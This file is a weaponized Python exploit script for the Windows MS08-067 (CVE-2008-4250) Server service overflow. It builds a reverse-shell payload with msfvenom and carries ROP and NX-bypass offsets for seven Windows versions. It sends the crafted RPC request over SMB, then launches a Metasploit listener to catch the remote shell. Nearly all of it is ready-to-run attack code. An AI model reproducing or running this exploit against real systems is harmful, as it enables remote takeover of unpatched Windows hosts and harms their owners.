#!/usr/bin/env python2
#  -*- coding: utf-8 -*- ####################################################################################
#▄▄       ▄▄  ▄▄▄▄▄▄▄▄▄▄▄   ▄▄▄▄▄▄▄▄▄   ▄▄▄▄▄▄▄▄▄▄▄   ▄▄▄▄▄▄▄▄▄   ▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄▄                  #
#▐░░▌     ▐░░▌▐░░░░░░░░░░░▌ ▐░░░░░░░░░▌ ▐░░░░░░░░░░░▌ ▐░░░░░░░░░▌ ▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌                #
#▐░▌░▌   ▐░▐░▌▐░█▀▀▀▀▀▀▀▀▀ ▐░█░█▀▀▀▀▀█░▌▐░█▀▀▀▀▀▀▀█░▌▐░█░█▀▀▀▀▀█░▌▐░█▀▀▀▀▀▀▀▀▀  ▀▀▀▀▀▀▀▀▀█░▌                #
#▐░▌▐░▌ ▐░▌▐░▌▐░▌          ▐░▌▐░▌    ▐░▌▐░▌       ▐░▌▐░▌▐░▌    ▐░▌▐░▌                   ▐░▌                 #
#▐░▌ ▐░▐░▌ ▐░▌▐░█▄▄▄▄▄▄▄▄▄ ▐░▌ ▐░▌   ▐░▌▐░█▄▄▄▄▄▄▄█░▌▐░▌ ▐░▌   ▐░▌▐░█▄▄▄▄▄▄▄▄▄         ▐░▌                  #
#▐░▌  ▐░▌  ▐░▌▐░░░░░░░░░░░▌▐░▌  ▐░▌  ▐░▌ ▐░░░░░░░░░▌ ▐░▌  ▐░▌  ▐░▌▐░░░░░░░░░░░▌       ▐░▌                   #
#▐░▌   ▀   ▐░▌ ▀▀▀▀▀▀▀▀▀█░▌▐░▌   ▐░▌ ▐░▌▐░█▀▀▀▀▀▀▀█░▌▐░▌   ▐░▌ ▐░▌▐░█▀▀▀▀▀▀▀█░▌      ▐░▌                    #
#▐░▌       ▐░▌          ▐░▌▐░▌    ▐░▌▐░▌▐░▌       ▐░▌▐░▌    ▐░▌▐░▌▐░▌       ▐░▌     ▐░▌                     #
#▐░▌       ▐░▌ ▄▄▄▄▄▄▄▄▄█░▌▐░█▄▄▄▄▄█░█░▌▐░█▄▄▄▄▄▄▄█░▌▐░█▄▄▄▄▄█░█░▌▐░█▄▄▄▄▄▄▄█░▌    ▐░▌                      #
#▐░▌       ▐░▌▐░░░░░░░░░░░▌ ▐░░░░░░░░░▌ ▐░░░░░░░░░░░▌ ▐░░░░░░░░░▌ ▐░░░░░░░░░░░▌   ▐░▌                       #
#▀         ▀  ▀▀▀▀▀▀▀▀▀▀▀   ▀▀▀▀▀▀▀▀▀   ▀▀▀▀▀▀▀▀▀▀▀   ▀▀▀▀▀▀▀▀▀   ▀▀▀▀▀▀▀▀▀▀▀     ▀                         #
# ms08_067.py - nighter                                                                                     #
#                                                                                                           #
# DATE                                                                                                      #
# 25/02/2019                                                                                                #
#                                                                                                           #
# DESCRIPTION                                                                                               #
# The Server service in Microsoft Windows 2000 SP4, XP SP2 and SP3, Server 2003 SP1 and SP2, Vista Gold     #
# and SP1, Server 2008, and 7 Pre-Beta allows remote attackers to execute arbitrary code via a              #
# crafted RPC request that triggers the overflow during path canonicalization                               #
#                                                                                                           #
# Note I have read several versions of this PoC and I have just weaponized it. So cannot take credz for the #
# b0f code. This version I have modified from Andy Acers version that is modified from Debasis Mohanty      #
# to make it even more user friendly                                                                        #
#                                                                                                           #
# nighter - http://nighter.se/                                                                              #
#                                                                                                           #
#############################################################################################################

import struct
import time
import sys
import os
import signal
from threading import Thread


# Handler to exist cleanly on ctrl+C
def signal_handler(signal, frame):
    print("\nYou pressed Ctrl+C!")
    sys.exit()
signal.signal(signal.SIGINT, signal_handler)


try:
    from impacket import smb
    from impacket import uuid
    #from impacket.dcerpc import dcerpc
    from impacket.dcerpc.v5 import transport

except ImportError, _:
    print 'Install the following library to make this script work'
    print 'Impacket : https://github.com/CoreSecurity/impacket.git'
    print 'PyCrypto : https://pypi.python.org/pypi/pycrypto'
    sys.exit(1)


def build_shellcode():

    print("[+] Build shellcode")
    cmd = """msfvenom -p windows/shell_reverse_tcp LHOST=%s LPORT=%s EXITFUNC=thread -a x86 --platform windows -b "\\x00\\x0a\\x0d\\x5c\\x5f\\x2f\\x2e\\x40" -f raw -o /tmp/shellcode.bin 2>/dev/null""" % (LHOST, LPORT)
    os.system(cmd)

    if os.path.isfile('/tmp/shellcode.bin') is False:
        print("[-] Generate shellcode failed")
        sys.exit(0)


def generate_rop(rvas):

    module_base = 0x6f880000
    gadget1 = "\x90\x5a\x59\xc3"
    gadget2 = ["\x90\x89\xc7\x83", "\xc7\x0c\x6a\x7f", "\x59\xf2\xa5\x90"]
    gadget3 = "\xcc\x90\xeb\x5a"
    ret = struct.pack('<L', 0x00018000)
    ret += struct.pack('<L', rvas['call_HeapCreate'] + module_base)
    ret += struct.pack('<L', 0x01040110)
    ret += struct.pack('<L', 0x01010101)
    ret += struct.pack('<L', 0x01010101)
    ret += struct.pack('<L',
                       rvas['add eax, ebp / mov ecx, 0x59ffffa8 / ret'] + module_base)
    ret += struct.pack('<L', rvas['pop ecx / ret'] + module_base)
    ret += gadget1
    ret += struct.pack('<L', rvas['mov [eax], ecx / ret'] + module_base)
    ret += struct.pack('<L', rvas['jmp eax'] + module_base)
    ret += gadget2[0]
    ret += gadget2[1]
    ret += struct.pack('<L', rvas[
                       'mov [eax+8], edx / mov [eax+0xc], ecx / mov [eax+0x10], ecx / ret'] + module_base)
    ret += struct.pack('<L', rvas['pop ecx / ret'] + module_base)
    ret += gadget2[2]
    ret += struct.pack('<L', rvas['mov [eax+0x10], ecx / ret'] + module_base)
    ret += struct.pack('<L', rvas['add eax, 8 / ret'] + module_base)
    ret += struct.pack('<L', rvas['jmp eax'] + module_base)
    ret += gadget3
    return ret


class SRVSVC_Exploit(Thread):
    def __init__(self):
        super(SRVSVC_Exploit, self).__init__()

        self.port = PORT
        self.target = HOST
        self.os = OS

    def __DCEPacket(self):

        time.sleep(2)
        build_shellcode()
        fp = open('/tmp/shellcode.bin', 'rb')
        shellcode = fp.read()
        fp.close()
        os.unlink('/tmp/shellcode.bin')

        time.sleep(15)
        print("[+] Exploit")

        # Gotta make No-Ops (NOPS) + shellcode = 410 bytes
        num_nops = 410 - len(shellcode)
        newshellcode = "\x90" * num_nops
        newshellcode += shellcode  # Add NOPS to the front
        shellcode = newshellcode  # Switcheroo with the newshellcode temp variable

        nonxjmper = "\x08\x04\x02\x00%s" + "A" * 4 + "%s" + \
                    "A" * 42 + "\x90" * 8 + "\xeb\x62" + "A" * 10
        disableNXjumper = "\x08\x04\x02\x00%s%s%s" + "A" * \
                          28 + "%s" + "\xeb\x02" + "\x90" * 2 + "\xeb\x62"
        ropjumper = "\x00\x08\x01\x00" + "%s" + "\x10\x01\x04\x01"

        if (self.os == '1'):
            print 'Windows XP SP0/SP1 Universal\n'
            ret = "\x61\x13\x00\x01"
            jumper = nonxjmper % (ret, ret)
        elif (self.os == '2'):
            print 'Windows 2000 Universal\n'
            ret = "\xb0\x1c\x1f\x00"
            jumper = nonxjmper % (ret, ret)
        elif (self.os == '3'):
            print 'Windows 2003 SP0 Universal\n'
            ret = "\x9e\x12\x00\x01"  # 0x01 00 12 9e
            jumper = nonxjmper % (ret, ret)
        elif (self.os == '4'):
            print 'Windows 2003 SP1 English\n'
            ret_dec = "\x8c\x56\x90\x7c"  # 0x7c 90 56 8c dec ESI, ret @SHELL32.DLL
            ret_pop = "\xf4\x7c\xa2\x7c"  # 0x 7c a2 7c f4 push ESI, pop EBP, ret @SHELL32.DLL
            jmp_esp = "\xd3\xfe\x86\x7c"  # 0x 7c 86 fe d3 jmp ESP @NTDLL.DLL
            disable_nx = "\x13\xe4\x83\x7c"  # 0x 7c 83 e4 13 NX disable @NTDLL.DLL
            jumper = disableNXjumper % (
                ret_dec * 6, ret_pop, disable_nx, jmp_esp * 2)
        elif (self.os == '5'):
            print 'Windows XP SP3 French (NX)\n'
            ret = "\x07\xf8\x5b\x59"  # 0x59 5b f8 07
            disable_nx = "\xc2\x17\x5c\x59"  # 0x59 5c 17 c2
            # the nonxjmper also work in this case.
            jumper = nonxjmper % (disable_nx, ret)
        elif (self.os == '6'):
            print 'Windows XP SP3 English (NX)\n'
            ret = "\x07\xf8\x88\x6f"  # 0x6f 88 f8 07
            disable_nx = "\xc2\x17\x89\x6f"  # 0x6f 89 17 c2
            # the nonxjmper also work in this case.
            jumper = nonxjmper % (disable_nx, ret)
        elif (self.os == '7'):
            print 'Windows XP SP3 English (AlwaysOn NX)\n'
            rvasets = {'call_HeapCreate': 0x21286, 'add eax, ebp / mov ecx, 0x59ffffa8 / ret': 0x2e796, 'pop ecx / ret': 0x2e796 + 6,
                'mov [eax], ecx / ret': 0xd296, 'jmp eax': 0x19c6f, 'mov [eax+8], edx / mov [eax+0xc], ecx / mov [eax+0x10], ecx / ret': 0x10a56, 'mov [eax+0x10], ecx / ret': 0x10a56 + 6, 'add eax, 8 / ret': 0x29c64}
            # the nonxjmper also work in this case.
            jumper = generate_rop(rvasets) + "AB"
        else:
            print 'Not supported OS version\n'
            sys.exit(-1)

        print '[+]Initiating connection'

        if (self.port == '445'):
            self.__trans = transport.DCERPCTransportFactory('ncacn_np:%s[\\pipe\\browser]' % self.target)
        else:
            # DCERPCTransportFactory doesn't call SMBTransport with necessary parameters. Calling directly here.
            # *SMBSERVER is used to force the library to query the server for its NetBIOS name and use that to
            #   establish a NetBIOS Session.  The NetBIOS session shows as NBSS in Wireshark.

            self.__trans = transport.SMBTransport(remoteName='*SMBSERVER', remote_host='%s' % self.target, dstport = int(self.port), filename='\\browser')

        self.__trans.connect()
        print '[-]connected to ncacn_np:%s[\\pipe\\browser]' % self.target
        self.__dce = self.__trans.DCERPC_class(self.__trans)
        self.__dce.bind(uuid.uuidtup_to_bin(
            ('4b324fc8-1670-01d3-1278-5a47bf6ee188', '3.0')))
        path = "\x5c\x00" + "ABCDEFGHIJ" * 10 + shellcode + "\x5c\x00\x2e\x00\x2e\x00\x5c\x00\x2e\x00\x2e\x00\x5c\x00" + \
            "\x41\x00\x42\x00\x43\x00\x44\x00\x45\x00\x46\x00\x47\x00" + jumper + "\x00" * 2
        server = "\xde\xa4\x98\xc5\x08\x00\x00\x00\x00\x00\x00\x00\x08\x00\x00\x00\x41\x00\x42\x00\x43\x00\x44\x00\x45\x00\x46\x00\x47\x00\x00\x00"
        prefix = "\x02\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x5c\x00\x00\x00"

        # NEW HOTNESS
        # The Path Length and the "Actual Count" SMB parameter have to match.  Path length in bytes
        #   is double the ActualCount field.  MaxCount also seems to match.  These fields in the SMB protocol
        #   store hex values in reverse byte order.  So: 36 01 00 00  => 00 00 01 36 => 310.  No idea why it's "doubled"
        #   from 310 to 620.  620 = 410 shellcode + extra stuff in the path.
        MaxCount = "\x36\x01\x00\x00"  # Decimal 310. => Path length of 620.
        Offset = "\x00\x00\x00\x00"
        ActualCount = "\x36\x01\x00\x00" # Decimal 310. => Path length of 620

        self.__stub = server + MaxCount + Offset + ActualCount + \
            path + "\xE8\x03\x00\x00" + prefix + "\x01\x10\x00\x00\x00\x00\x00\x00"

        return

    def run(self):
        self.__DCEPacket()
        self.__dce.call(0x1f, self.__stub)
        time.sleep(3)
        print('[*] Done')


def start_listener():

    print("[+] Start listener")
    listener = "msfconsole -q -x 'use multi/handler;set PAYLOAD windows/shell_reverse_tcp;set LHOST %s;set LPORT %s;run'" % (LHOST, LPORT)
    os.system(listener)


def exploit():

    current = SRVSVC_Exploit()
    current.start()


def check():

    os.system("nmap -p 139,445 --script-args=unsafe=1 --script /usr/share/nmap/scripts/smb-os-discovery %s -P0" % HOST)

def vuln():

    os.system("sudo nmap -p U:137,T:139,T:445 --script=smb-vuln-ms08-067.nse %s -P0" % HOST)


if __name__ == '__main__':

    try:
        if sys.argv[2].lower() == 'check':
            HOST = sys.argv[1]
            check()
            os._exit(0)
        elif sys.argv[2].lower() == 'vuln':
            HOST = sys.argv[1]
            vuln()
            os._exit(0)
    except:
        pass

    if len(sys.argv) != 5:
        print ("""
 ▄▄       ▄▄  ▄▄▄▄▄▄▄▄▄▄▄   ▄▄▄▄▄▄▄▄▄   ▄▄▄▄▄▄▄▄▄▄▄   ▄▄▄▄▄▄▄▄▄   ▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄▄ 
▐░░▌     ▐░░▌▐░░░░░░░░░░░▌ ▐░░░░░░░░░▌ ▐░░░░░░░░░░░▌ ▐░░░░░░░░░▌ ▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌
▐░▌░▌   ▐░▐░▌▐░█▀▀▀▀▀▀▀▀▀ ▐░█░█▀▀▀▀▀█░▌▐░█▀▀▀▀▀▀▀█░▌▐░█░█▀▀▀▀▀█░▌▐░█▀▀▀▀▀▀▀▀▀  ▀▀▀▀▀▀▀▀▀█░▌
▐░▌▐░▌ ▐░▌▐░▌▐░▌          ▐░▌▐░▌    ▐░▌▐░▌       ▐░▌▐░▌▐░▌    ▐░▌▐░▌                   ▐░▌ 
▐░▌ ▐░▐░▌ ▐░▌▐░█▄▄▄▄▄▄▄▄▄ ▐░▌ ▐░▌   ▐░▌▐░█▄▄▄▄▄▄▄█░▌▐░▌ ▐░▌   ▐░▌▐░█▄▄▄▄▄▄▄▄▄         ▐░▌  
▐░▌  ▐░▌  ▐░▌▐░░░░░░░░░░░▌▐░▌  ▐░▌  ▐░▌ ▐░░░░░░░░░▌ ▐░▌  ▐░▌  ▐░▌▐░░░░░░░░░░░▌       ▐░▌   
▐░▌   ▀   ▐░▌ ▀▀▀▀▀▀▀▀▀█░▌▐░▌   ▐░▌ ▐░▌▐░█▀▀▀▀▀▀▀█░▌▐░▌   ▐░▌ ▐░▌▐░█▀▀▀▀▀▀▀█░▌      ▐░▌    
▐░▌       ▐░▌          ▐░▌▐░▌    ▐░▌▐░▌▐░▌       ▐░▌▐░▌    ▐░▌▐░▌▐░▌       ▐░▌     ▐░▌     
▐░▌       ▐░▌ ▄▄▄▄▄▄▄▄▄█░▌▐░█▄▄▄▄▄█░█░▌▐░█▄▄▄▄▄▄▄█░▌▐░█▄▄▄▄▄█░█░▌▐░█▄▄▄▄▄▄▄█░▌    ▐░▌      
▐░▌       ▐░▌▐░░░░░░░░░░░▌ ▐░░░░░░░░░▌ ▐░░░░░░░░░░░▌ ▐░░░░░░░░░▌ ▐░░░░░░░░░░░▌   ▐░▌       
 ▀         ▀  ▀▀▀▀▀▀▀▀▀▀▀   ▀▀▀▀▀▀▀▀▀   ▀▀▀▀▀▀▀▀▀▀▀   ▀▀▀▀▀▀▀▀▀   ▀▀▀▀▀▀▀▀▀▀▀     ▀     
 
  *~ OFFSET ~*
  [1] Windows XP SP0/SP1 Universal 
  [2] Windows 2000 Universal (port:139,445)
  [3] Windows 2003 SP0 Universal
  [4] Windows 2003 SP1 English
  [5] Windows XP SP3 French (NX)
  [6] Windows XP SP3 English (NX)
  [7] Windows XP SP3 English (AlwaysOn NX)
  
[nighter@nighter.se] - CVE-2008-4250
           """)
        print("Usage: %s <HOST>:<PORT> <LHOST> <LPORT> [1-7]" % (sys.argv[0]))
        print("\nEXAMPLE: ./ms08_067_netapi.py '10.10.10.70' check")
        print("EXAMPLE: ./ms08_067_netapi.py '10.10.10.70' vuln")
        print("EXAMPLE: ./ms08_067_netapi.py '10.10.10.70:445' 10.10.14.24 1337 1\n")
        sys.exit(0)

    HOST = sys.argv[1]
    if ':' in HOST:
        (HOST, PORT) = HOST.split(':')
    else:
        PORT = '445'

    LHOST = sys.argv[2]
    LPORT = sys.argv[3]
    OS = sys.argv[4]

    if os.path.isfile('/usr/bin/msfconsole') is False:
        print('[-] Please install metasploit for run this PoC.')
        sys.exit(1)

    exploit()
    start_listener()
